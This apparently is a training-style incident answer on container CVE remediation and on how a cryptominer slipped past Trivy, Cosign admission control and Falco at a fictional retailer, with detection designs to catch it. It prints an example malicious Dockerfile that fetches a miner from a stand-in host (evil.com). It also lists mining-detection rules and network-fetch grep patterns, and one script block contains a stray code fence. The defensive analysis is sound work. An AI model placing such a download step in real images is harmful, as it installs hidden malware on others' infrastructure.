+# The 3 pinned-digest services are handled separately (see Q3.3)
+```
+
+**Safety gates in each pipeline:**
+1. ✅ Trivy scan must pass (confirm CVE-2024-XXXX is NOT present)
+2. ✅ Cosign signature applied
+3. ✅ Unit tests pass
+4. ⚠️ Integration tests — run but don't block (time-critical)
+5. ✅ Image pushed to ECR with new tag
+
+**Hour 2:00–3:00 — Rolling Deployment (Priority Order)**
+
+```bash
+# Deploy P0 services first (internet-facing)
+# Use ArgoCD or kubectl with rolling update strategy
+
+# For each service, in priority order:
+kubectl set image deployment/$svc $svc=$NEW_IMAGE -n $NAMESPACE
+
+# Monitor each rollout
+kubectl rollout status deployment/$svc -n $NAMESPACE --timeout=300s
+
+# Verify the new pods are running the patched image
+kubectl get pods -n $NAMESPACE -l app=$svc -o jsonpath='{.items[*].status.containerStatuses[0].imageID}'
+```
+
+Deploy order: P0 → P1 → P2, with health checks between each.
+
+**Hour 3:00–3:30 — Verification**
+
+```bash
+# Re-run ECR scan on all 12 new images
+for img in "${NEW_IMAGES[@]}"; do
+  aws ecr start-image-scan --repository-name $REPO --image-id imageTag=$TAG
+done
+
+# Verify no running pod has the vulnerable digest
+kubectl get pods -A -o json | jq -r '
+  .status.containerStatuses[]? | .imageID' | \
+  grep -f /tmp/vulnerable-digests.txt
+# Should return NOTHING
+```
+
+**Hour 3:30–4:00 — Communication and Close**
+
+> ✅ `#security-incidents`: "All 12 services patched and deployed. CVE-2024-XXXX remediated. No evidence of exploitation. Post-incident review scheduled for [date]."
+
+Update the CISO with:
+- 12/12 services patched
+- Time from alert to full remediation: X hours
+- Verification scans clean
+- No downtime observed
+
+---
+
+### 3. Handling 3 Pinned-Digest Services (Team on Vacation)
+
+**This is the hardest part — organizational AND technical.**
+
+**Technical Steps:**
+
+```bash
+# Step 1: Identify the 3 services and their repos
+# Example: checkout-svc, returns-svc, loyalty-svc
+# Their Dockerfiles have:
+# FROM gcr.io/distroless/java17-debian12@sha256:abc123...
+
+# Step 2: Fork/branch their repos (you have write access as platform team)
+for repo in checkout-svc returns-svc loyalty-svc; do
+  git clone git@bitbucket.org:novamart/$repo.git
+  cd $repo
+  git checkout -b security/CVE-2024-XXXX-emergency-patch
+  
+  # Step 3: Get the patched base image digest
+  NEW_DIGEST=$(docker inspect --format='{{index .RepoDigests 0}}' \
+    gcr.io/distroless/java17-debian12:latest | cut -d@ -f2)
+  
+  # Step 4: Update the pinned digest
+  sed -i "s|gcr.io/distroless/java17-debian12@sha256:abc123.*|gcr.io/distroless/java17-debian12@${NEW_DIGEST}|g" Dockerfile
+  
+  git add Dockerfile
+  git commit -m "SECURITY: Update base image digest for CVE-2024-XXXX
+
+  Emergency patch - team on vacation.
+  Old digest: sha256:abc123...
+  New digest: ${NEW_DIGEST}
+  
+  Approved by: [CISO Name], [Platform Lead Name]
+  Incident: INC-2024-XXX"
+  
+  git push origin security/CVE-2024-XXXX-emergency-patch
+  
+  # Step 5: Create PR with auto-merge (requires 1 approval from security team)
+  # The PR triggers the CI pipeline which builds, scans, signs, and deploys
+  cd ..
+done
+```
+
+**Organizational Considerations:**
+
+1. **Authorization:** Get explicit written approval (Slack message is fine) from:
+   - CISO (security authority)
+   - Engineering Director or VP (overrides team ownership for emergencies)
+   - Document in incident channel: "Modifying code owned by [team] per emergency security protocol. Team is OOO."
+
+2. **Minimize changes:** Change ONLY the digest pin. Nothing else. This minimizes risk of breaking their service.
+
+3. **Notification to the team:**
+   - Send an email/Slack DM to each team member: "We made an emergency change to your repo. Here's the PR. Here's why. Please review when you return."
+   - Leave detailed PR descriptions explaining exactly what changed and why
+   - Tag the PR with `security-emergency` label
+
+4. **Rollback plan:** If any of the 3 services break after the base image update:
+   ```bash
+   kubectl rollout undo deployment/$svc -n $NAMESPACE
+   ```
+   And escalate to find someone from the team (call their manager, check emergency contacts).
+
+5. **Policy update:** After this incident, establish that:
+   - Pinned digests must have a documented update process
+   - Every team must have a designated backup for security emergencies
+   - Platform team has standing authorization for base-image-only changes during CVE response
+
+---
+
+### 4. Automated CVE-to-Deploy Pipeline
+
+```
+┌──────────────┐    ┌──────────────┐    ┌──────────────┐    ┌──────────────┐    ┌──────────────┐
+│  CVE FEED    │───►│  CORRELATOR  │───►│  DECISION    │───►│  REBUILD     │───►│  DEPLOY      │
+│  (Trigger)   │    │  (Match)     │    │  ENGINE      │    │  (Pipeline)  │    │  (Rollout)   │
+└──────────────┘    └──────────────┘    └──────────────┘    └──────────────┘    └──────────────┘
+```
+
+**Architecture:**
+
+```yaml
+# EventBridge rule to trigger on ECR scan findings
+# or subscribe to OSV/NVD feeds directly
+
+# 1. TRIGGER: ECR EventBridge → Lambda
+AWSTemplateFormatVersion: '2010-09-09'
+Resources:
+  CVEAlertRule:
+    Type: AWS::Events::Rule
+    Properties:
+      EventPattern:
+        source: ["aws.ecr"]
+        detail-type: ["ECR Image Scan"]
+        detail:
+          finding-severity-counts:
+            CRITICAL: [{"numeric": [">", 0]}]
+      Targets:
+        - Arn: !GetAtt CVECorrelatorLambda.Arn
+          Id: CVECorrelator
+```
+
+**Decision Logic (in the Lambda/Step Function):**
+
+```python
+def cve_response_handler(event):
+    cve_id = event['detail']['finding']['name']
+    cvss_score = event['detail']['finding']['cvss']['score']
+    affected_images = get_affected_images_from_ecr(cve_id)
+    running_in_prod = cross_reference_with_cluster(affected_images)
+    
+    # DECISION MATRIX
+    if cvss_score >= 9.0 and len(running_in_prod) > 0:
+        # CRITICAL + running in prod = AUTO-REBUILD with human gate before deploy
+        action = "AUTO_REBUILD_GATE_DEPLOY"
+        notify_channel = "#security-incidents"
+        sla_hours = 4
+    elif cvss_score >= 7.0 and len(running_in_prod) > 0:
+        # HIGH + running = auto-rebuild, auto-deploy to staging, human gate for prod
+        action = "AUTO_REBUILD_AUTO_STAGING_GATE_PROD"
+        notify_channel = "#security-alerts"  
+        sla_hours = 24
+    elif cvss_score >= 7.0:
+        # HIGH but not running = ticket + auto-rebuild, no deploy
+        action = "AUTO_REBUILD_TICKET"
+        notify_channel = "#security-alerts"
+        sla_hours = 72
+    else:
+        # MEDIUM/LOW = ticket only
+        action = "TICKET_ONLY"
+        notify_channel = "#security-low"
+        sla_hours = 168  # 1 week
+    
+    # Check for CISA KEV (Known Exploited Vulnerabilities)
+    if is_in_cisa_kev(cve_id):
+        action = "AUTO_REBUILD_GATE_DEPLOY"  # Escalate regardless of CVSS
+        sla_hours = min(sla_hours, 4)
+    
+    return {
+        "action": action,
+        "affected_services": running_in_prod,
+        "cve": cve_id,
+        "sla_hours": sla_hours,
+        "notify": notify_channel
+    }
+```
+
+**Safety Gates:**
+
+```
+GATE 1: Rebuild
+  ├── ✅ Auto: Trigger CI pipeline for each affected service
+  ├── ✅ Auto: Trivy scan confirms CVE is resolved in new image
+  └── ✅ Auto: Cosign signs the image
+
+GATE 2: Testing  
+  ├── ✅ Auto: Unit tests pass
+  ├── ✅ Auto: Integration tests pass
+  └── ⚠️ Auto: If tests fail → STOP, alert human, do NOT proceed
+
+GATE 3: Staging Deploy
+  ├── ✅ Auto: Deploy to staging
+  ├── ✅ Auto: Smoke tests pass
+  └── ✅ Auto: 15-min soak period — no errors in logs/metrics
+
+GATE 4: Production Deploy (HUMAN GATE for CVSS ≥ 9.0)
+  ├── 🧑 Human: Security engineer approves (Slack interactive message)
+  │     "CVE-2024-XXXX patched. 12 services rebuilt. Staging green.
+  │      [APPROVE PROD DEPLOY] [REJECT] [DEFER 1HR]"
+  ├── ✅ Auto: Rolling deploy with canary (10% → 50% → 100%)
+  ├── ✅ Auto: Error rate monitoring (auto-rollback if error rate > baseline + 1%)
+  └── ✅ Auto: Post-deploy ECR scan confirms clean
+
+GATE 5: Verification
+  ├── ✅ Auto: All running pods verified on patched image
+  ├── ✅ Auto: JIRA ticket auto-closed with evidence
+  └── ✅ Auto: Compliance report updated
+```
+
+**For the pinned-digest problem specifically:**
+
+```yaml
+# Add a scheduled job that checks for stale pinned digests
+apiVersion: batch/v1
+kind: CronJob
+metadata:
+  name: digest-staleness-checker
+spec:
+  schedule: "0 6 * * *"  # Daily at 6 AM
+  jobTemplate:
+    spec:
+      template:
+        spec:
+          containers:
+            - name: checker
+              image: novamart/digest-checker:latest
+              # Scans all Dockerfiles in all repos
+              # Compares pinned digests to latest available
+              # Alerts if pinned digest has known CVEs
+              # Creates auto-update PRs when drift detected
+```
+
+**Key automation principle:** The pipeline should take a CRITICAL CVE from "published" to "rebuild complete + staging verified" with **zero** human intervention. The only human gate is the **production deploy approval** for CRITICAL severity, and even that has a timeout — if no human responds within 1 hour, it auto-escalates to the VP of Engineering's phone.
+
+---
+
+## Q4: Defense in Depth Failure Analysis 🔥
+
+### CI/CD Layer: Why the Cryptominer Passed
+
+**Why Trivy missed it:**
+
+Trivy is a **vulnerability scanner**, not a **malware scanner**. Here's precisely what it does and doesn't do:
+
+- ✅ **Trivy scans:** OS packages (dpkg, rpm, apk), language dependencies (pom.xml, package-lock.json, go.sum), known CVEs in those packages, IaC misconfigurations
+- ❌ **Trivy does NOT:** Analyze arbitrary binaries for malicious behavior, detect unknown malware, perform behavioral analysis, identify cryptominer binaries that aren't in a CVE database
+
+The cryptominer binary (e.g., `xmrig`) was compiled and embedded directly in the Dockerfile. It's not an OS package, it's not a known vulnerable library — it's just a binary. Trivy has no signature database for malware binaries. Even if the attacker used a well-known miner like xmrig, Trivy wouldn't flag it because **Trivy matches CVEs against package manifests, not binary hashes.**
+
+The multi-stage build made it even harder:
+```dockerfile
+# Stage 1: build (intermediate — might not even be scanned)
+FROM ubuntu as builder
+RUN apt-get install -y wget
+RUN wget https://evil.com/miner -O /opt/miner    # ← Downloaded in build stage
+RUN chmod +x /opt/miner
+
+# Stage 2: final
+FROM gcr.io/distroless/java17-debian12
+COPY --from=builder /opt/miner /usr/local/bin/worker  # ← Innocuous name
+COPY app.jar /app/app.jar
+ENTRYPOINT ["java", "-jar", "/app/app.jar"]
+# A startup script or entrypoint wrapper runs "worker" in the background
+```
+
+Trivy scans the **final image's package manifest**. The miner binary was `COPY`'d in, so it doesn't appear in any package database. It's invisible to Trivy.
+
+**Why SonarQube missed it:**
+
+SonarQube is a **static code analysis** tool for source code. It analyzes:
+- ✅ Java/Python/JS source code for bugs, code smells, security hotspots
+- ✅ Hardcoded credentials, SQL injection patterns, XSS vectors
+- ❌ **Does NOT analyze:** Dockerfiles (beyond basic rules), binary files, container image contents, runtime behavior
+
+The attacker modified the **Dockerfile**, not the Java source code. SonarQube doesn't deeply analyze Dockerfile `RUN` commands for malicious downloads. Even if it looked at the Dockerfile, `wget https://...` is a common pattern in build stages — it's not inherently suspicious to a static analyzer.
+
+**The specific scanning gap:**
+
+Neither tool performs **binary content analysis** or **behavioral analysis** on the final container image. The gap is:
+1. No binary hash checking against known malware databases (e.g., VirusTotal, ClamAV)
+2. No Dockerfile command analysis for suspicious network fetches in build stages
+3. No comparison of image layer diff to detect unexpected new executables
+4. No runtime behavioral profile that says "this image should only run `java` — any other binary is suspicious"
+
+---
+
+### Admission Layer: Why Admission Control Cannot Catch This
+
+The image was:
+- ✅ Built by the authorized CI pipeline
+- ✅ Scanned by Trivy (no CVEs found — because it's malware, not a CVE)
+- ✅ Signed by Cosign with the CI pipeline's key
+- ✅ Pushed to the authorized ECR registry
+- ✅ Deployed via ArgoCD from the Git repo
+
+**Gatekeeper/Kyverno policies check:**
+- Is the image from an allowed registry? → Yes, it's from `888888888888.dkr.ecr.us-east-1.amazonaws.com`
+- Is the image signed? → Yes, Cosign verified
+- Does the image tag match allowed patterns? → Yes
+- Does the pod spec meet security standards? → Yes (if PSS was applied)
+
+**The fundamental problem:** Admission control validates **provenance and policy compliance**, not **content correctness**. The image was legitimately built and signed through the authorized pipeline. The signature proves the image is exactly what the CI pipeline produced — but the CI pipeline produced a malicious image because the source code was malicious.
+
+**This is the "legitimate pipeline, malicious input" problem.** Cosign proves authenticity, not benignity. It's like a notarized document — the notary verifies your identity, not that the document's content is good.
+
+**What this means for security architecture:**
+
+Admission control is a **necessary but insufficient** layer. It prevents unauthorized images from running, but it **trusts the supply chain**. When the supply chain itself is compromised (developer credentials stolen → malicious commit → CI builds it faithfully), admission control becomes a rubber stamp.
+
+You need layers that don't trust the supply chain output:
+- Runtime behavioral monitoring (Falco)
+- Binary analysis in the pipeline (beyond CVE scanning)
+- Anomaly detection on resource usage
+- Code review requirements (the commit bypassed review)
+
+---
+
+### Runtime Layer: Why Falco Missed It for 3 Weeks
+
+**Reason 1: The cryptominer process name didn't match Falco rules**
+
+NovaMart's Falco rules likely match known miner process names:
+```yaml
+- rule: Detect crypto miners
+  condition: >
+    spawned_process and container and
+    proc.name in (xmrig, minerd, cpuminer, minergate, stratum)
+```
+
+The attacker named the binary `worker`, `app-helper`, or something equally innocuous. **Process-name-based detection is trivially evaded.** The attacker could also have run the miner as a thread within the Java process itself (e.g., a Java-based miner loaded via reflection), meaning no new process is spawned at all.
+
+**Reason 2: The cryptominer was part of the original image — no "drift"**
+
+Falco's container drift detection works by comparing running executables against the original image contents. Since the cryptominer binary was **baked into the image at build time** (COPY --from=builder), it IS part of the original image. There's no drift — the binary was always there.
+
+```
+Container Drift Detection:
+  Original image contains: java, worker (miner)
+  Running processes: java, worker (miner)
+  Drift? NO — everything matches the original image
+```
+
+This is fundamentally different from Q2's scenario where `curl` was downloaded at runtime.
+
+**Reason 3: No network rules for mining pool connections**
+
+Cryptominers must connect to mining pools (typically on ports like 3333, 3334, 4444, 5555, 8333, or via Stratum protocol over TLS on 443). If Falco didn't have rules for:
+- Outbound connections to known mining pool IPs/domains
+- Connections on unusual ports from application containers
+- Stratum protocol detection
+
+Then the network activity would go undetected. If the miner used TLS on port 443 to connect to its pool, it looks like normal HTTPS traffic.
+
+**Reason 4 (Bonus): Falco alert fatigue / misconfigured alerting**
+
+It's possible Falco DID fire a lower-priority alert that was:
+- Lost in noise (too many INFO/WARNING alerts)
+- Routed to a log aggregator but not to PagerDuty
+- Filtered out by an overly broad exception rule
+- The Falco daemonset pod on that specific node was OOMKilled or crashlooping
+
+---
+
+### Detection Design That Would Catch This Within Hours
+
+**Layer 1: Resource Metrics Anomaly Detection**
+
+Cryptominers have an unmistakable signature: **sustained high CPU usage.**
+
+```promql
+# Alert: Container CPU usage significantly above historical baseline
+# for sustained period (cryptominer signature)
+
+# Step 1: Define baseline (7-day rolling average)
+avg_over_time(
+  rate(container_cpu_usage_seconds_total{namespace="search"}[5m])[7d:1h]
+)
+
+# Step 2: Alert when current usage exceeds baseline by 3x for >30 minutes
+ALERT CryptoMinerSuspected
+  expr: |
+    (
+      rate(container_cpu_usage_seconds_total{namespace=~".+"}[5m])
+      /
+      avg_over_time(rate(container_cpu_usage_seconds_total[5m])[7d:1h])
+    ) > 3
+  for: 30m
+  labels:
+    severity: critical
+  annotations:
+    summary: "Container {{ $labels.container }} in {{ $labels.namespace }} CPU usage 3x above baseline for 30+ minutes — possible cryptominer"
+```
+
+This would have fired within the first hour. A cryptominer pegs CPU at 100% — a Java service normally runs at 10-30%. A 3x+ increase sustained for 30 minutes is almost certainly anomalous.
+
+```promql
+# Additional metric: CPU throttling
+# Cryptominers consume all available CPU, causing throttling
+ALERT SustainedCPUThrottling
+  expr: |
+    rate(container_cpu_cfs_throttled_seconds_total[5m])
+    / rate(container_cpu_cfs_periods_total[5m]) > 0.8
+  for: 1h
+  labels:
+    severity: warning
+```
+
+**Layer 2: Enhanced Falco Rules**
+
+```yaml
+# Rule 1: Detect ANY unexpected process in a container
+# This requires maintaining an allowed process list per image
+- rule: Unauthorized process in container
+  desc: >
+    Detect processes that are not in the container's expected process list.
+    This catches cryptominers regardless of their name.
+  condition: >
+    spawned_process and
+    container and
+    not proc.name in (java, sh, bash, tini, pause) and
+    not proc.pname in (java, containerd-shim)
+  output: >
+    Unexpected process spawned (process=%proc.name cmdline=%proc.cmdline
+    parent=%proc.pname container=%container.name image=%container.image.repository
+    pod=%k8s.pod.name ns=%k8s.ns.name)
+  priority: WARNING
+
+# Rule 2: Detect Stratum mining protocol (network-level)
+- rule: Stratum mining protocol detected
+  desc: Detect Stratum protocol handshake used by cryptominers
+  condition: >
+    evt.type in (write, sendto) and
+    fd.type = ipv4 and
+    container and
+    (evt.buffer contains "mining.subscribe" or
+     evt.buffer contains "mining.authorize" or
+     evt.buffer contains "mining.submit" or
+     evt.buffer contains "stratum+tcp")
+  output: >
+    Stratum mining protocol detected (command=%proc.cmdline connection=%fd.name
+    container=%container.name pod=%k8s.pod.name ns=%k8s.ns.name)
+  priority: CRITICAL
+
+# Rule 3: Sustained high CPU syscall rate
+# Cryptominers make intensive compute syscalls
+- rule: Abnormally high compute syscall rate
+  desc: Detect containers with suspiciously high CPU-bound syscall rates
+  condition: >
+    container and
+    evt.type in (futex, clock_gettime, sched_yield) and
+    container.id != host
+  output: >
+    High compute syscall rate detected (container=%container.name
+    pod=%k8s.pod.name ns=%k8s.ns.name)
+  priority: INFO
+  # Note: This would feed into a rate-based external alerter,
+  # not trigger on individual events
+```
+
+**Layer 3: Network-Level Detection**
+
+```yaml
+# NetworkPolicy that blocks connections to known mining pools
+# Combined with DNS monitoring
+apiVersion: networking.k8s.io/v1
+kind: NetworkPolicy
+metadata:
+  name: deny-mining-pools
+spec:
+  podSelector: {}
+  policyTypes:
+    - Egress
+  egress:
+    - to:
+        - ipBlock:
+            cidr: 0.0.0.0/0
+            except:
+              # Known mining pool IP ranges (maintained list)
+              - 104.142.244.0/24    # Example pool ranges
+              - 144.217.0.0/16
+              # ... maintained by threat intel feed
+```
+
+```bash
+# DNS query monitoring for mining pool domains
+# Alert on DNS lookups for known mining pool domains:
+# pool.minexmr.com, xmr.nanopool.org, monerohash.com, etc.
+
+# CloudWatch Logs Insights query:
+fields @timestamp, srcaddr, query_name
+| filter query_name like /pool\.|mining\.|xmr\.|monero\.|nicehash\.|stratum/
+| sort @timestamp desc
+```
+
+**Layer 4: Image Layer Analysis (Pipeline Enhancement)**
+
+```yaml
+# Add to CI pipeline AFTER Trivy scan:
+- name: Binary Analysis
+  script: |
+    # Extract all executables from the final image
+    docker save $IMAGE | tar -x
+    find . -type f -executable | while read binary; do
+      # Check against ClamAV
+      clamscan --no-summary "$binary"
+      
+      # Check binary hash against VirusTotal
+      HASH=$(sha256sum "$binary" | cut -d' ' -f1)
+      curl -s "https://www.virustotal.com/api/v3/files/$HASH" \
+        -H "x-apikey: $VT_KEY" | jq '.data.attributes.last_analysis_stats'
+      
+      ```yaml
+      # Check if binary is a known mining tool
+      strings "$binary" | grep -iE "stratum|mining|pool|xmrig|cryptonight|randomx|hashrate|wallet|coin" > /tmp/mining-strings.txt
+      if [ -s /tmp/mining-strings.txt ]; then
+        echo "⛔ SUSPICIOUS BINARY DETECTED: $binary"
+        echo "Mining-related strings found:"
+        cat /tmp/mining-strings.txt
+        exit 1
+      fi
+      
+      # Check for unexpected ELF binaries not from package manager
+      if file "$binary" | grep -q "ELF"; then
+        # Verify this binary belongs to a known installed package
+        BASENAME=$(basename "$binary")
+        if ! dpkg -S "$binary" 2>/dev/null && \
+           ! rpm -qf "$binary" 2>/dev/null; then
+          echo "⚠️ UNPACKAGED BINARY: $binary is not from any installed package"
+          echo "This binary was manually added — requires manual review"
+          # Don't auto-fail, but flag for human review
+          UNPACKAGED_BINARIES="$UNPACKAGED_BINARIES $binary"
+        fi
+      fi
+    done
+    
+    # Final gate: if any unpackaged binaries found, require explicit approval
+    if [ -n "$UNPACKAGED_BINARIES" ]; then
+      echo "🔍 REVIEW REQUIRED: Unpackaged binaries detected:"
+      echo "$UNPACKAGED_BINARIES"
+      # Post to Slack for security team review
+      # Pipeline pauses until approved or rejected
+      exit 1
+    fi
+
+- name: Image Layer Diff Analysis
+  script: |
+    # Compare image layers against previous version
+    # Detect unexpected new executables added between versions
+    
+    # Pull previous image
+    docker pull $REGISTRY/$SERVICE:latest-stable
+    
+    # Export filesystem listings
+    docker export $(docker create $REGISTRY/$SERVICE:latest-stable) | \
+      tar -t | sort > /tmp/old-image-files.txt
+    docker export $(docker create $IMAGE) | \
+      tar -t | sort > /tmp/new-image-files.txt
+    
+    # Diff — find new files
+    NEW_FILES=$(comm -13 /tmp/old-image-files.txt /tmp/new-image-files.txt)
+    
+    # Flag any new executable files that weren't in the previous image
+    echo "$NEW_FILES" | while read f; do
+      if file "$f" 2>/dev/null | grep -qE "ELF|executable|script"; then
+        echo "⚠️ NEW EXECUTABLE in image: $f"
+        SUSPICIOUS=true
+      fi
+    done
+    
+    if [ "$SUSPICIOUS" = true ]; then
+      echo "New executables detected in image diff — requires security review"
+      exit 1
+    fi
+```
+
+**Layer 5: Dockerfile Change Detection (Git-Level)**
+
+This is the layer that catches it EARLIEST — before anything is even built:
+
+```yaml
+# Bitbucket Pipeline or GitHub Actions step
+# Triggered on any PR that modifies a Dockerfile
+
+- name: Dockerfile Security Review
+  script: |
+    # Get changed files in this PR
+    CHANGED=$(git diff --name-only origin/main...HEAD)
+    
+    # If any Dockerfile changed, perform deep analysis
+    echo "$CHANGED" | grep -i dockerfile | while read dockerfile; do
+      echo "🔍 Analyzing changes to $dockerfile"
+      
+      # Check 1: New network fetches (wget, curl, git clone, etc.)
+      DIFF=$(git diff origin/main...HEAD -- "$dockerfile")
+      if echo "$DIFF" | grep -E '^\+.*\b(wget|curl|git clone|pip install|npm install|go get)\b' | \
+         grep -vE '^\+\s*#'; then
+        echo "⛔ ALERT: New network fetch detected in Dockerfile:"
+        echo "$DIFF" | grep -E '^\+.*\b(wget|curl|git clone)\b'
+        echo ""
+        echo "External downloads in Dockerfiles require security team approval."
+        echo "If this is legitimate, add a comment: # security-approved: JIRA-XXXX"
+        NEEDS_REVIEW=true
+      fi
+      
+      # Check 2: COPY --from with suspicious source paths
+      if echo "$DIFF" | grep -E '^\+.*COPY\s+--from=' | \
+         grep -vE '(\.jar|\.war|\.class|\.config|\.properties|\.yaml)'; then
+        echo "⚠️ COPY --from detected with non-standard file types:"
+        echo "$DIFF" | grep -E '^\+.*COPY\s+--from='
+        NEEDS_REVIEW=true
+      fi
+      
+      # Check 3: New RUN commands that download binaries
+      if echo "$DIFF" | grep -E '^\+.*RUN.*https?://' | \
+         grep -vE '(apt-get|yum|apk|pip|npm|maven|gradle)'; then
+        echo "⛔ ALERT: RUN command downloads from external URL:"
+        echo "$DIFF" | grep -E '^\+.*RUN.*https?://'
+        NEEDS_REVIEW=true
+      fi
+      
+      # Check 4: chmod +x on new files
+      if echo "$DIFF" | grep -E '^\+.*chmod\s+\+x'; then
+        echo "⚠️ New executable permissions being set:"
+        echo "$DIFF" | grep -E '^\+.*chmod\s+\+x'
+        NEEDS_REVIEW=true
+      fi
+    done
+    
+    if [ "$NEEDS_REVIEW" = true ]; then
+      # Auto-request review from security team
+      # Block merge until approved
+      echo "::error::Dockerfile changes require security team review"
+      exit 1
+    fi
+```
+
+**Layer 6: Runtime Behavioral Profiling**
+
+This is the most sophisticated detection — profile what a container SHOULD do, alert when it deviates:
+
+```yaml
+# Deploy a behavioral profiling tool (e.g., KubeArmor, Sysdig Secure)
+# or build custom profiling with Falco + Prometheus
+
+# Step 1: During a "learning period" (first 7 days of a new deployment),
+# record the behavioral profile:
+#   - Which processes run
+#   - Which files are accessed
+#   - Which network connections are made
+#   - Typical CPU/memory usage range
+
+# Step 2: After learning, enforce the profile
+
+# Example KubeArmor policy generated from profile:
+apiVersion: security.kubearmor.com/v1
+kind: KubeArmorPolicy
+metadata:
+  name: search-svc-profile
+  namespace: search
+spec:
+  selector:
+    matchLabels:
+      app: search-svc
+  process:
+    matchPaths:
+      - path: /usr/bin/java
+        action: Allow
+      - path: /usr/local/openjdk-17/bin/java
+        action: Allow
+    matchDirectories:
+      - dir: /usr/local/bin/
+        action: Block    # ← This catches the cryptominer "worker" binary
+        severity: 10
+  network:
+    matchProtocols:
+      - protocol: tcp
+        action: Allow
+        fromSource:
+          - path: /usr/bin/java
+      - protocol: udp
+        action: Allow
+        fromSource:
+          - path: /usr/bin/java
+    # Any network connection NOT from java = blocked and alerted
+```
+
+---
+
+### Complete Detection Architecture Summary
+
+```
+┌─────────────────────────────────────────────────────────────────────┐
+│                    CRYPTOMINER DETECTION LAYERS                       │
+├─────────┬──────────────────────┬────────────────┬───────────────────┤
+│  LAYER  │  WHAT IT CATCHES     │  DETECTION     │  TIME TO DETECT   │
+│         │                      │  METHOD        │                   │
+├─────────┼──────────────────────┼────────────────┼───────────────────┤
+│ Git PR  │ Suspicious           │ Dockerfile     │ Before build      │
+│ Review  │ Dockerfile changes   │ diff analysis  │ (minutes)         │
+├─────────┼──────────────────────┼────────────────┼───────────────────┤
+│ CI/CD   │ Malware binaries in  │ ClamAV +       │ During build      │
+│ Scan    │ final image          │ VirusTotal +   │ (minutes)         │
+│         │                      │ strings scan   │                   │
+├─────────┼──────────────────────┼────────────────┼───────────────────┤
+│ CI/CD   │ Unexpected new       │ Layer diff     │ During build      │
+│ Diff    │ executables          │ vs previous    │ (minutes)         │
+├─────────┼──────────────────────┼────────────────┼───────────────────┤
+│ Runtime │ Unknown process      │ Falco +        │ Within seconds    │
+│ Process │ execution            │ behavioral     │ of container      │
+│         │                      │ profile        │ start             │
+├─────────┼──────────────────────┼────────────────┼───────────────────┤
+│ Runtime │ Mining protocol      │ Falco network  │ First pool        │
+│ Network │ (Stratum)            │ buffer inspect │ connection        │
+│         │                      │                │ (~seconds)        │
+├─────────┼──────────────────────┼────────────────┼───────────────────┤
+│ Metrics │ Sustained CPU        │ Prometheus     │ 30 min            │
+│ Anomaly │ spike above          │ anomaly alert  │ (by design —      │
+│         │ baseline             │                │ avoid flapping)   │
+├─────────┼──────────────────────┼────────────────┼───────────────────┤
+│ Network │ Connections to       │ DNS monitoring │ First DNS         │
+│ Intel   │ known mining pools   │ + threat intel │ lookup            │
+│         │                      │ IP blocklist   │ (~seconds)        │
+├─────────┼──────────────────────┼────────────────┼───────────────────┤
+│ Cost    │ Unexplained compute  │ AWS Cost       │ Hours to days     │
+│ Anomaly │ cost increase        │ Anomaly        │ (billing delay)   │
+│         │                      │ Detection      │                   │
+└─────────┴──────────────────────┴────────────────┴───────────────────┘
+```
+
+**The critical lesson from Q4:** No single layer would have been sufficient. The attacker bypassed CI/CD (legitimate build), admission control (signed image), and basic Falco rules (renamed binary, no drift). The attack specifically exploited the **trust boundaries between layers** — each layer assumed the previous layer had validated the content.
+
+The fix requires:
+
+1. **Don't trust the pipeline output** — add binary/behavioral analysis that doesn't depend on CVE databases
+2. **Don't trust process names** — use behavioral profiling and resource anomaly detection
+3. **Don't trust network patterns** — use protocol-level inspection and threat intel feeds
+4. **Require code review for Dockerfiles** — the attacker's commit should have required a second pair of eyes. A branch protection rule requiring at least one approval from a CODEOWNERS-designated security reviewer for any Dockerfile change would have caught this before CI even ran
+
+```yaml
+# Bitbucket/GitHub CODEOWNERS
+# Require security team review for all Dockerfile changes
+**/Dockerfile @novamart/security-team
+**/Dockerfile.* @novamart/security-team
+**/.dockerignore @novamart/security-team
+```
+
+This is the **cheapest and most effective control** — a human reviewer looking at `wget https://evil.com/miner` in a Dockerfile diff would have immediately flagged it. The attacker succeeded because the compromised developer credentials allowed a **direct push to main**, bypassing branch protection and code review. Enforcing branch protection with no exceptions — not even for "trusted" developers — would have stopped the entire attack chain at step 2.
+
+
